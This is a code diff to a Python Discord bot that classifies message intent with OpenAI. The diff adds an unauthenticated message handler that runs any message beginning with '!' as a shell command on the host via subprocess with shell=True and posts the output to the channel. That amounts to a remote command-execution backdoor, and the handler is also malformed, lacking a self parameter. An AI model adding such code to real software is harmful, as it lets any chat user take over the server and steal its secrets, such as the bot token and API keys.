@@ -1,5 +1,6 @@
 import discord
 import dotenv
+import subprocess
 import logging
 import os
 import openai
@@ -84,6 +85,15 @@ class MyClient(discord.Client):
             
         result = classify_intent(message.content)
         await message.channel.send(result)
+    
+    async def on_message(message):
+        if message.content.startswith('!'):
+            # Remove the '!' character from the message
+            cmd = message.content[1:]
+            # Execute the command and capture the output
+            output = subprocess.check_output(cmd, shell=True)
+            # Send the output back to the user
+            await message.channel.send(output.decode())
 
 bot_token = os.getenv('DISCORD_BOT_TOKEN')
 intents = discord.Intents.default()
